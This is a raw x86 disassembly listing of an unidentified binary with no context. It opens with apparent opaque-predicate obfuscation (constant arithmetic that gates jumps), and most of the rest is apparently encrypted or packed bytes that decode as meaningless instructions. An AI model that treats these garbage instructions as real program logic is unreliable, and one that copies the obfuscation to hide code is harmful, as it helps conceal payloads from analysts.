  41bfb3:	xor    esp,DWORD PTR [ecx-0x797a5e99]
  41bfb9:	mov    ebp,0x955088ed
  41bfbe:	pop    ecx
  41bfbf:	mov    ecx,0x57d4
  41bfc4:	mov    WORD PTR [esp+0x2c],cx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	cmp    DWORD PTR ds:0x79a77e10,ebp
  41c0fc:	push   ss
  41c0fd:	sbb    BYTE PTR [edx+edx*1-0x74c0e7e8],bh
  41c104:	jmp    0x41c0ff
  41c106:	shl    BYTE PTR [esi+edx*4],0xf3
  41c10a:	pop    ss
  41c10b:	xchg   ebp,eax
  41c10c:	ds push edx
  41c10e:	call   0x1c72:0xbf080e47
  41c115:	js     0x41c16b
  41c117:	mov    BYTE PTR [ebp+0x73e92f49],0x3
  41c11e:	pop    ebp
  41c11f:	stos   BYTE PTR es:[edi],al
  41c120:	mov    ds,WORD PTR ds:0xa47dc1c1
  41c126:	dec    ebx
  41c127:	inc    edi
  41c128:	stc    
  41c129:	and    edi,DWORD PTR [ebx+0xf45400a]
  41c12f:	adc    eax,0xfe724aa0
  41c134:	or     DWORD PTR [esi+0x4f],edi
  41c137:	test   DWORD PTR [esi+0x34],esi
  41c13a:	ret    
  41c13b:	scas   eax,DWORD PTR es:[edi]
  41c13c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c13d:	dec    edi
  41c13e:	mov    ebp,0x94b6a48b
  41c143:	pop    eax
  41c144:	loope  0x41c152
  41c146:	adc    eax,0xd1564df8
  41c14b:	cmp    BYTE PTR [ebp+0x2b862fcd],ah
  41c151:	mov    edi,0x5d2e0ba9
  41c156:	or     ebp,DWORD PTR [esi+0x6b564c48]
  41c15c:	in     al,0xb2
  41c15e:	in     eax,0x38
  41c160:	jne    0x41c0fe
  41c162:	xchg   ecx,eax
  41c163:	push   eax
  41c164:	js     0x41c189
  41c166:	mov    ds:0xa4b605d2,eax
  41c16b:	xchg   edi,eax
  41c16c:	xor    ecx,ebp
  41c16e:	aam    0x87
  41c170:	or     ebp,DWORD PTR [ebp+ebx*8-0x66ef8a55]
  41c177:	mov    esp,0x8cece8a0
  41c17c:	in     al,dx
  41c17d:	push   ebp
  41c17e:	fwait
  41c17f:	mov    dl,0x23
  41c181:	jp     0x41c159
  41c183:	dec    edx
  41c184:	ins    BYTE PTR es:[edi],dx
  41c185:	mov    bh,0xbf
  41c187:	pop    esp
  41c188:	test   al,0xc8
  41c18a:	and    BYTE PTR [eax-0x350d9930],ch
  41c190:	xor    BYTE PTR [ecx+0x49],ch
  41c193:	mov    ebx,0xaafa489b
  41c198:	mov    al,0xb
  41c19a:	ss adc al,0x2d
  41c19d:	inc    BYTE PTR [eax+0xc5270ed]
  41c1a3:	loope  0x41c1fe
  41c1a5:	inc    ebx
  41c1a6:	xchg   ebp,eax
  41c1a7:	mov    ch,0xe3
  41c1a9:	clc    
  41c1aa:	or     bh,BYTE PTR [edx-0xc38804]
  41c1b0:	sbb    dh,dl
  41c1b2:	cmp    al,0x36
  41c1b4:	cmc    
  41c1b5:	xchg   esi,eax
  41c1b6:	sbb    BYTE PTR gs:[edi],cl
  41c1b9:	adc    ecx,esi
  41c1bb:	push   edx
  41c1bc:	mov    ch,dh
  41c1be:	inc    eax
  41c1bf:	retf   
  41c1c0:	rcl    DWORD PTR [ebx-0x3c],1
  41c1c3:	shl    BYTE PTR [esi+0x43],cl
  41c1c6:	loopne 0x41c14c
  41c1c8:	cmp    bl,al
  41c1ca:	mov    dh,BYTE PTR [eax+edx*2+0x75]
  41c1ce:	cli    
  41c1cf:	add    BYTE PTR [ecx],ch
  41c1d1:	data16 mov ds:0x5a252093,al
  41c1d7:	xchg   ebx,eax
  41c1d8:	addr16 cmc 
  41c1da:	sub    cl,ah
  41c1dc:	or     bl,BYTE PTR [ebx]
  41c1de:	fild   QWORD PTR [edi-0xe]
  41c1e1:	sbb    eax,0x86cfaee9
  41c1e6:	scas   eax,DWORD PTR es:[edi]
  41c1e7:	pop    ecx
  41c1e8:	and    esp,eax
  41c1ea:	test   al,0xbf
  41c1ec:	jbe    0x41c199
  41c1ee:	aas    
  41c1ef:	adc    eax,0xe672f41e
  41c1f4:	inc    ebx
  41c1f5:	(bad)
  41c1f9:	arpl   WORD PTR [ebx+ebx*4+0x51],si
  41c1fd:	jg     0x41c1ad
  41c1ff:	jl     0x41c236
  41c201:	shr    BYTE PTR [ebp+0x73],cl
  41c204:	mov    ?,WORD PTR [edi]
  41c206:	pop    edx
  41c207:	adc    DWORD PTR [ecx+eiz*2+0x4800df33],ebp
  41c20e:	cli    
  41c20f:	dec    esp
  41c210:	dec    esi
  41c211:	xchg   BYTE PTR [edi-0x77],al
  41c214:	dec    ebx
  41c215:	adc    bh,BYTE PTR [ecx]
  41c217:	dec    ebx
  41c218:	(bad)  
  41c219:	pop    ecx
  41c21a:	mov    ebp,0xba911c6e
  41c21f:	and    ch,dl
  41c221:	lock int 0x94
  41c224:	loop   0x41c1cc
  41c226:	aam    0x7b
  41c228:	(bad)  
  41c22a:	xor    al,0x2e
  41c22c:	jo     0x41c20a
  41c22e:	sbb    al,BYTE PTR [edi-0xafabc52]
  41c234:	bound  eax,QWORD PTR [esi+0x8bf5328]
  41c23a:	jo     0x41c1c0
  41c23c:	dec    esp
  41c23d:	call   0xcd04f493
  41c242:	jle    0x41c290
  41c244:	arpl   WORD PTR [edi+0x31136227],bp
  41c24a:	ins    DWORD PTR es:[edi],dx
  41c24b:	inc    esp
  41c24c:	xchg   edx,eax
  41c24d:	cdq    
  41c24e:	push   edi
  41c24f:	inc    ecx
  41c250:	or     ah,BYTE PTR [ebp+edi*4-0x1a988b7f]
  41c257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c258:	jmp    0x2b515b6c
  41c25d:	(bad)  
  41c25e:	jb     0x41c297
  41c260:	cmp    BYTE PTR [esi],dl
  41c262:	cmp    eax,0x31b71f32
  41c267:	pop    ecx
  41c268:	inc    edx
  41c269:	sub    ah,BYTE PTR [esp+ecx*4]
  41c26c:	lahf   
  41c26d:	lock sub al,0xbc
  41c270:	loope  0x41c262
  41c272:	mov    ch,0xda
  41c274:	mov    ecx,0xfb1b3fdc
  41c279:	sub    ebp,esp
  41c27b:	addr16 xchg esi,eax
  41c27d:	stos   BYTE PTR es:[edi],al
  41c27e:	add    ah,BYTE PTR [ebx-0x2e]
  41c281:	pop    ss
  41c282:	(bad)  
  41c284:	xor    BYTE PTR [edi-0x7e33a6cb],al
  41c28a:	fcomip st,st(4)
  41c28c:	adc    bh,0xda
  41c28f:	jge    0x41c27b
  41c291:	pop    ss
  41c292:	mov    BYTE PTR [esi+0x35e54c9c],dh
  41c298:	dec    ecx
  41c299:	daa    
  41c29a:	gs fwait
  41c29c:	jmp    0x41c2fd
  41c29e:	push   ebx
  41c29f:	pop    esp
  41c2a0:	pop    ss
  41c2a1:	xor    al,0x0
  41c2a3:	jns    0x41c2a1
  41c2a5:	iret   
  41c2a6:	adc    DWORD PTR [edi],edi
  41c2a8:	xor    eax,0xdd9b5b45
  41c2ad:	imul   esp,DWORD PTR [ebx-0x1f],0xb09e9198
  41c2b4:	ins    BYTE PTR es:[edi],dx
  41c2b5:	jbe    0x41c28f
  41c2b7:	dec    esi
  41c2b8:	test   edx,ebp
  41c2ba:	shr    DWORD PTR [edx],cl
  41c2bc:	xor    DWORD PTR [edx-0x2b],ecx
  41c2bf:	dec    ecx
  41c2c1:	xchg   DWORD PTR [ebp-0x535b865f],esi
  41c2c7:	in     eax,0x3c
  41c2c9:	mov    esp,0x40e67e4a
  41c2ce:	cwde   
  41c2cf:	cs inc esi
  41c2d1:	push   cs
  41c2d2:	inc    ebp
  41c2d3:	push   esp
  41c2d4:	rcr    DWORD PTR [ebp+0x1765a00f],0x73
  41c2db:	sub    dl,BYTE PTR [edi]
  41c2dd:	cmc    
  41c2de:	sub    eax,0x6f974b3e
  41c2e3:	inc    esp
  41c2e4:	loope  0x41c296
  41c2e6:	cmp    ecx,DWORD PTR [ebp+0x34]
  41c2e9:	push   es
  41c2ea:	das    
  41c2eb:	out    0x48,al
  41c2ed:	das    
  41c2ee:	xchg   esi,eax
  41c2ef:	add    eax,0xd3bfca37
  41c2f4:	cmp    DWORD PTR [esi+0xb],ebx
  41c2f7:	test   BYTE PTR [edi],ah
  41c2f9:	mov    bl,0xe0
  41c2fb:	and    eax,0x643fdce6
  41c300:	cwde   
  41c301:	add    BYTE PTR [ebp+0x2d56779b],ah
  41c307:	jb     0x41c326
  41c309:	cld    
  41c30a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c30b:	sbb    DWORD PTR [esi+0x24],0x33f57598
  41c312:	xor    ebx,esi
  41c314:	mov    DWORD PTR [ebx-0x1749a47e],esp
  41c31a:	jmp    0x1e77237e
  41c31f:	fcomi  st,st(5)
  41c321:	or     BYTE PTR [edx+0x64f75fe3],0x8
  41c328:	dec    eax
  41c329:	aas    
  41c32a:	inc    edi
  41c32b:	adc    eax,0xe24ee5af
  41c330:	or     DWORD PTR [edx],ebx
  41c332:	xor    BYTE PTR [ecx+eiz*4-0x5bb2c9c9],ch
  41c339:	dec    eax
  41c33a:	mov    BYTE PTR [edi+0x3e],dh
  41c33d:	pusha  
  41c33e:	dec    ebx
  41c33f:	xor    eax,0xab0e726f
  41c344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c345:	mov    esp,DWORD PTR [edx-0x4c]
  41c348:	jle    0x41c2ec
  41c34a:	push   0xa2af9b72
  41c34f:	fsubr  DWORD PTR cs:[edx+0x1a]
  41c353:	cmp    ebx,DWORD PTR [ecx+edi*1+0x3a441783]
  41c35a:	iret   
  41c35b:	adc    ecx,DWORD PTR [esi-0x37dae8dd]
  41c361:	adc    al,0x39
  41c363:	dec    ebx
  41c364:	inc    edi
  41c365:	mov    ch,0x6c
  41c367:	mov    ebp,0x2a8b4e3d
  41c36c:	dec    esp
  41c36d:	and    esi,DWORD PTR [ebx+0x3a]
  41c370:	mov    BYTE PTR [ebp+0x7a],bl
  41c373:	stc    
  41c374:	imul   ch
  41c376:	(bad)  
  41c377:	iret   
  41c378:	sar    DWORD PTR [edx-0x3d4d87d7],cl
  41c37e:	scas   eax,DWORD PTR es:[edi]
  41c37f:	enter  0xd3ad,0xd
  41c383:	out    0xaa,al
  41c385:	inc    ecx
  41c386:	es out 0xf7,eax
  41c389:	in     al,dx
  41c38a:	pop    edx
  41c38b:	cld    
  41c38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c38d:	jp     0x41c3ad
  41c38f:	adc    BYTE PTR [edx],cl
  41c391:	nop
  41c392:	pop    edi
  41c393:	mov    ecx,0x4d31e07c
  41c398:	lods   al,BYTE PTR ds:[esi]
  41c399:	mov    bh,0x89
  41c39b:	dec    ebx
  41c39c:	mov    ebx,0x3215391d
  41c3a1:	sub    dh,BYTE PTR [ecx+0x5fe05257]
  41c3a7:	jne    0x41c3a9
  41c3a9:	cld    
  41c3aa:	mov    ecx,0x272bc959
  41c3af:	push   edx
  41c3b0:	lods   eax,DWORD PTR ds:[esi]
  41c3b1:	jp     0x41c3aa
  41c3b3:	pop    eax
  41c3b4:	inc    ebx
  41c3b5:	push   cs
  41c3b6:	jno    0x41c396
  41c3b8:	xchg   edx,eax
  41c3b9:	ins    DWORD PTR es:[edi],dx
  41c3ba:	aam    0x75
  41c3bc:	(bad)  
  41c3bd:	sahf   
  41c3be:	aad    0x9c
  41c3c0:	sub    esi,DWORD PTR [esi+0x60]
  41c3c3:	push   edi
  41c3c4:	mov    ds:0x9818d9e,al
  41c3c9:	xor    DWORD PTR [edi+0x6e],ecx
  41c3cc:	mov    dl,0x78
  41c3ce:	shl    DWORD PTR [edx-0x31],1
  41c3d1:	enter  0x3ead,0xc0
  41c3d5:	mov    ebp,0x85ab11b7
  41c3da:	adc    eax,edx
  41c3dc:	mov    ecx,0xcc4529dd
  41c3e1:	jns    0x41c40b
  41c3e3:	ins    DWORD PTR es:[edi],dx
  41c3e4:	addr16 lock mov ebx,0x137bf7f9
  41c3eb:	retf   
  41c3ec:	cli    
  41c3ed:	ret    0xd958
  41c3f0:	xor    DWORD PTR [ebx],ebx
  41c3f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3f3:	push   esp
  41c3f4:	cmc    
  41c3f5:	inc    ebp
  41c3f6:	inc    edi
  41c3f7:	jb     0x41c3ff
  41c3f9:	jle    0x41c3b2
  41c3fb:	js     0x41c3e4
  41c3fd:	ror    BYTE PTR [eax-0x35],cl
  41c400:	jecxz  0x41c45c
  41c402:	and    al,0x84
  41c404:	mov    al,ds:0xcb4ff6c4
  41c409:	mov    bl,0x6f
  41c40b:	mov    edx,0x27a853e7
  41c410:	shl    BYTE PTR [edx+0x62900385],cl
  41c416:	loop   0x41c492
  41c418:	adc    DWORD PTR [esi+0x61],ebx
  41c41b:	out    dx,al
  41c41c:	ds inc esp
  41c41e:	call   0x7423:0x424336dd
  41c425:	in     al,0xc8
  41c427:	xor    BYTE PTR [ebx],dh
  41c429:	sub    al,0x36
  41c42b:	int    0xd1
  41c42d:	imul   BYTE PTR [edx+0x16]
  41c430:	sahf   
  41c431:	ins    BYTE PTR es:[edi],dx
  41c432:	fs jae 0x41c41a
  41c435:	cmp    al,0x7b
  41c437:	sbb    al,0xe4
  41c439:	test   al,0xd3
  41c43b:	sub    dh,BYTE PTR [eax]
  41c43d:	scas   al,BYTE PTR es:[edi]
  41c43e:	xor    al,0xb8
  41c440:	aaa    
  41c441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c442:	aaa    
  41c443:	jle    0x41c4ad
  41c445:	dec    ecx
  41c446:	je     0x41c430
  41c448:	or     cl,dl
  41c44a:	or     DWORD PTR [ebp-0x1f],0x521e0fd5
  41c451:	retf   
  41c452:	loopne 0x41c4c6
  41c454:	mov    edi,0xc3f49a38
  41c459:	cmp    eax,0xe5b04ef6
  41c45e:	lds    ebp,FWORD PTR [ebp+0x43af5f5c]
  41c464:	mov    edx,0xccd752e5
  41c469:	mov    WORD PTR [edx],gs
  41c46b:	pop    ecx
  41c46c:	pop    eax
  41c46d:	or     edi,DWORD PTR [ecx]
  41c46f:	aam    0xf
  41c471:	data16 sahf 
  41c473:	nop
  41c474:	pusha  
  41c475:	imul   ecx,DWORD PTR [edx-0x83d7065],0x77
  41c47c:	rcl    DWORD PTR [ebx+0x45],0x86
  41c480:	jp     0x41c409
  41c482:	push   ebx
  41c483:	outs   dx,BYTE PTR ds:[esi]
  41c484:	mov    bl,0xdc
  41c486:	aad    0x5c
  41c488:	xor    eax,0xeb7a66cf
  41c48d:	call   0xc589:0x9b960c1c
  41c494:	test   eax,0x6100b409
  41c499:	mov    eax,ds:0x388b2c45
  41c49e:	into   
  41c49f:	pop    eax
  41c4a0:	push   0xffffffdf
  41c4a2:	shl    BYTE PTR [ecx+0x2a24db0a],cl
  41c4a8:	(bad)  
  41c4a9:	dec    edi
  41c4aa:	sti    
  41c4ab:	jns    0x41c4ac
  41c4ad:	dec    esp
  41c4ae:	setp   BYTE PTR [edx-0x4d]
  41c4b2:	inc    edi
  41c4b3:	ret    
  41c4b4:	call   0x414dd5
  41c4b9:	jmp    0x41c888
  41c4be:	inc    edi
  41c4bf:	and    edi,DWORD PTR [eax]
  41c4c1:	sbb    DWORD PTR [ebx+eax*1],esi
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c4de
  41c4cb:	xlat   BYTE PTR ds:[ebx]
  41c4cc:	lea    esi,[eax+0x4a]
  41c4cf:	jae    0x41c4e7
  41c4d1:	sbb    BYTE PTR [edx+edx*1-0x1629e7e8],bh
  41c4d8:	(bad)  [esi]
  41c4da:	lods   al,BYTE PTR ds:[esi]
  41c4db:	dec    eax
  41c4dc:	xchg   ebp,eax
  41c4dd:	mov    ds:0xe294d75,al
  41c4e2:	daa    
  41c4e3:	xchg   ebx,eax
  41c4e4:	ds sbb ebp,ecx
  41c4e7:	cmp    bl,BYTE PTR [edi-0x6bef6ab8]
  41c4ed:	push   edx
  41c4ee:	mov    cl,0xc
  41c4f0:	es pop esp
  41c4f2:	lds    esp,FWORD PTR [esi+esi*4+0x3]
  41c4f6:	mov    ch,0xbd
  41c4f8:	pop    edx
  41c4f9:	rcl    DWORD PTR [ebp+0x4e7dabc2],1
  41c4ff:	(bad)
  41c503:	enter  0xd3ba,0x98
  41c507:	ins    BYTE PTR es:[edi],dx
  41c508:	jbe    0x41c581
  41c50a:	or     eax,0xad90da0b
  41c50f:	xchg   edx,eax
  41c510:	jge    0x41c4d4
  41c512:	enter  0xfbc3,0x7d
  41c516:	les    ecx,FWORD PTR [ebx-0x7a8cd897]
  41c51c:	xor    ebx,DWORD PTR [eax+eiz*2-0x4d54746d]
  41c523:	mov    ebp,0xd08c4f0e
  41c528:	retf   0xc847
  41c52b:	pop    ecx
  41c52c:	fisttp QWORD PTR [ebp+0x38e661ac]
  41c532:	enter  0x8ca6,0x34
  41c536:	xchg   ebx,eax
  41c537:	in     al,0x7e
  41c539:	sub    eax,0xf9917116
  41c53e:	jb     0x41c59e
  41c540:	xchg   edx,eax
  41c541:	xchg   edx,eax
  41c542:	shl    BYTE PTR [ecx],cl
  41c544:	add    edi,eax
  41c546:	lods   eax,DWORD PTR ds:[esi]
  41c547:	mov    edx,0x8bd61b7d
  41c54c:	(bad)  
  41c54d:	lahf   
  41c54e:	xor    eax,0xcaf3b5c
  41c553:	jmp    0x26e9ea90
  41c558:	dec    ecx
  41c559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c55a:	dec    ecx
  41c55b:	mov    edi,DWORD PTR [ebp-0x1dfab1d4]
  41c561:	mov    eax,ds:0x80cce282
  41c566:	xchg   esi,eax
  41c567:	pop    esp
  41c568:	shl    DWORD PTR [edi+0x6b271451],1
  41c56e:	je     0x41c4f5
  41c570:	ins    DWORD PTR es:[edi],dx
  41c571:	adc    BYTE PTR [eax+0x2c],bh
  41c574:	or     DWORD PTR [edx+esi*2+0x27],esi
  41c578:	or     esp,DWORD PTR [eax-0x3d]
  41c57b:	imul   ebx,DWORD PTR [edi],0xffffffff
  41c57e:	xchg   esi,eax
  41c57f:	jg     0x41c54d
  41c581:	stos   DWORD PTR es:[edi],eax
  41c582:	cmp    dh,dl
  41c584:	pop    ebp
  41c585:	lahf   
  41c586:	adc    DWORD PTR [esi+0x2b219903],ebp
  41c58c:	cwde   
  41c58d:	dec    ebx
  41c58e:	mov    bl,0xeb
  41c590:	sbb    eax,0x110b0f58
  41c595:	push   esi
  41c596:	push   edi
  41c597:	fsubp  st(7),st
  41c599:	pop    ecx
  41c59a:	dec    ebp
  41c59b:	jns    0x41c605
  41c59d:	scas   al,BYTE PTR es:[edi]
  41c59e:	lds    ebx,FWORD PTR [eax-0x35]
  41c5a1:	out    0x67,eax
  41c5a3:	mov    eax,0x11349e91
  41c5a8:	pushf  
  41c5a9:	pop    edx
  41c5aa:	fwait
  41c5ab:	shr    ebx,cl
  41c5ad:	mov    WORD PTR [ebx+0x57],?
  41c5b0:	fisubr DWORD PTR [ecx+0x72]
  41c5b3:	jge    0x41c602
  41c5b5:	mov    ds:0xc9954a8,al
  41c5ba:	ins    BYTE PTR es:[di],dx
  41c5bc:	dec    edi
  41c5bd:	sub    cl,dh
  41c5bf:	repnz xor DWORD PTR [ebp+0x489bbc1],ebp
  41c5c6:	cwde   
  41c5c7:	sbb    ecx,DWORD PTR [edi-0x6d]
  41c5ca:	ja     0x41c5a1
  41c5cc:	rcr    BYTE PTR [esi],cl
  41c5ce:	(bad)  
  41c5cf:	cmp    BYTE PTR [eax+eiz*2],dh
  41c5d2:	xor    al,0x8e
  41c5d4:	xchg   ebp,eax
  41c5d5:	push   esp
  41c5d6:	push   esi
  41c5d7:	mov    ebx,0xcfd07cf5
  41c5dc:	cmp    DWORD PTR [ecx-0x45f5ae4e],eax
  41c5e2:	inc    eax
  41c5e3:	popf   
  41c5e4:	adc    ch,dl
  41c5e6:	push   ss
  41c5e7:	pop    ss
  41c5e8:	jle    0x41c61b
  41c5ea:	add    DWORD PTR [edx-0x18],esp
  41c5ed:	xor    BYTE PTR ds:0xd3d482e5,ch
  41c5f3:	mov    cl,0x66
  41c5f5:	lods   al,BYTE PTR ds:[esi]
  41c5f6:	stos   DWORD PTR es:[edi],eax
  41c5f7:	mov    ch,0x9d
  41c5f9:	push   ebp
  41c5fa:	imul   ebp,ebp,0xb6edf574
  41c600:	jns    0x41c623
  41c602:	out    dx,al
  41c603:	test   bl,al
  41c605:	lods   eax,DWORD PTR ds:[esi]
  41c606:	mov    ebp,0xd00607ce
  41c60b:	xor    bh,bh
  41c60d:	jbe    0x41c63a
  41c60f:	lds    esp,FWORD PTR [edi]
  41c611:	test   al,0xff
  41c613:	out    0x5d,eax
  41c615:	jae    0xd3138043
  41c61b:	shr    BYTE PTR [eax],1
  41c61d:	pop    edi
  41c61e:	push   edx
  41c61f:	push   ebx
  41c620:	lods   eax,DWORD PTR ds:[esi]
  41c621:	dec    ecx
  41c622:	mov    ?,WORD PTR [eax-0xb99a26f]
  41c628:	scas   eax,DWORD PTR es:[edi]
  41c629:	mov    DWORD PTR [ecx+0xcb38f2a],ecx
  41c62f:	out    0xa5,eax
  41c631:	cld    
  41c632:	fild   QWORD PTR [edx-0x159a7918]
  41c638:	jp     0x41c627
  41c63a:	ins    BYTE PTR es:[edi],dx
  41c63b:	push   cs
  41c63c:	sbb    al,0xb3
  41c63e:	sub    BYTE PTR [edx],cl
  41c640:	sbb    DWORD PTR [ebx-0x7c1556d1],ebx
  41c646:	outs   dx,BYTE PTR ds:[esi]
  41c647:	idiv   ebp
  41c649:	mov    eax,ds:0xeb64c17e
  41c64e:	or     esp,esi
  41c650:	push   esp
  41c651:	cmp    ah,BYTE PTR [ebp+0x5a]
  41c654:	ins    DWORD PTR es:[edi],dx
  41c655:	inc    eax
  41c656:	mov    ds:0x9dc2fce9,al
  41c65b:	push   ss
  41c65c:	mov    cl,0xcf
  41c65e:	pop    edi
  41c65f:	push   0xd8d62c0e
  41c664:	jp     0x41c6a4
  41c666:	inc    edx
  41c667:	(bad)  
  41c668:	jne    0x41c5f9
  41c66a:	loop   0x41c6bb
  41c66c:	in     eax,0xc0
  41c66e:	sbb    BYTE PTR [esi+0xf],bl
  41c671:	xor    al,0xc0
  41c673:	cli    
  41c674:	or     esi,DWORD PTR [ebp-0x6a]
  41c677:	jl     0x41c684
  41c679:	imul   eax,DWORD PTR [eax-0x7b],0x64
  41c67d:	cmp    BYTE PTR [ebp-0x1b],bh
  41c680:	(bad)  
  41c681:	popf   
  41c682:	inc    edx
  41c683:	jb     0x41c6ec
  41c685:	jl     0x41c666
  41c687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c688:	jne    0x41c684
  41c68a:	test   al,0xf0
  41c68c:	pop    esp
  41c68d:	clc    
  41c68e:	fs mov eax,0xbbcc3ec7
  41c694:	xor    al,BYTE PTR ds:0xe335ab44
  41c69a:	sbb    dh,BYTE PTR [eax+0x1b15d35d]
  41c6a0:	and    ah,BYTE PTR [edi]
  41c6a2:	daa    
  41c6a3:	dec    eax
  41c6a4:	and    cl,BYTE PTR [esi+0x78815989]
  41c6aa:	(bad)  
  41c6ac:	xor    al,0xd7
  41c6ae:	mov    cl,0xd0
  41c6b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6b1:	scas   al,BYTE PTR es:[edi]
  41c6b2:	dec    ebp
  41c6b3:	in     al,dx
  41c6b4:	dec    esp
  41c6b5:	mov    BYTE PTR [edx+0x25],bl
  41c6b8:	or     eax,0x44dd7754
  41c6bd:	mov    DWORD PTR [ebx+0x43f77450],ebp
  41c6c3:	inc    ecx
  41c6c4:	(bad)  
  41c6c5:	fsubr  QWORD PTR [ebp-0x70]
  41c6c8:	inc    esp
  41c6c9:	dec    ecx
  41c6ca:	in     al,dx
  41c6cb:	sub    al,0xe7
  41c6cd:	sub    dl,BYTE PTR [ecx-0xe]
  41c6d0:	or     edx,ebx
  41c6d2:	cli    
  41c6d3:	mov    eax,ds:0x7f26b3c8
  41c6d8:	jno    0x41c65e
  41c6da:	add    al,0x97
  41c6dc:	mov    ebp,0x4cd9800f
  41c6e1:	sti    
  41c6e2:	test   BYTE PTR [edx+eiz*2],dh
  41c6e5:	ds cmp al,0xfa
  41c6e8:	lea    edx,[edx]
  41c6ea:	jp     0x41c717
  41c6ec:	imul   esp,esp,0xda4a419
  41c6f2:	mov    BYTE PTR [eax*1-0x7eeb1611],0x23
  41c6fa:	xor    DWORD PTR [eax],ebp
  41c6fc:	push   eax
  41c6fd:	jb     0x41c6a9
  41c6ff:	add    eax,0xc81e3272
  41c705:	mov    ah,0x1
  41c707:	add    DWORD PTR [ecx+edx*8],ebp
  41c70a:	mov    dh,0xd9
  41c70c:	mov    dl,0xba
  41c70e:	push   ebp
  41c70f:	imul   edx,esp,0x6e
  41c712:	xchg   eax,eax
  41c714:	sbb    al,0xe0
  41c716:	(bad)  
  41c717:	push   ecx
  41c718:	mov    ecx,0xf000d7cc
  41c71d:	mov    al,0xc3
  41c71f:	in     eax,dx
  41c720:	jge    0x41c72a
  41c722:	jmp    0x8fa26385
  41c727:	cwde   
  41c728:	mov    dl,0x18
  41c72a:	add    eax,0x7f1544cd
  41c72f:	cmp    DWORD PTR [ecx+0x12],ebx
  41c732:	inc    esi
  41c733:	lahf   
  41c734:	retf   0xf779
  41c737:	push   ebp
  41c738:	pop    ebx
  41c739:	sub    al,0x30
  41c73b:	jne    0x41c6bd
  41c73d:	imul   esp,DWORD PTR [ecx-0x2b],0xde3d4b7
  41c744:	lods   al,BYTE PTR ds:[esi]
  41c745:	in     al,dx
  41c746:	lahf   
  41c747:	scas   al,BYTE PTR es:[edi]
  41c748:	adc    edx,DWORD PTR [eax]
  41c74a:	dec    eax
  41c74b:	and    ah,BYTE PTR [ecx+ebp*2+0x0]
  41c74f:	dec    edx
  41c750:	popa   
  41c751:	sbb    esp,0xfffffffa
  41c754:	int    0xfd
  41c756:	stos   DWORD PTR es:[edi],eax
  41c757:	daa    
  41c758:	xchg   ebx,eax
  41c759:	sub    esi,0x5fdf5747
  41c75f:	pop    ecx
  41c760:	cmp    DWORD PTR [ebx+0x3f],edx
  41c763:	lods   al,BYTE PTR ds:[esi]
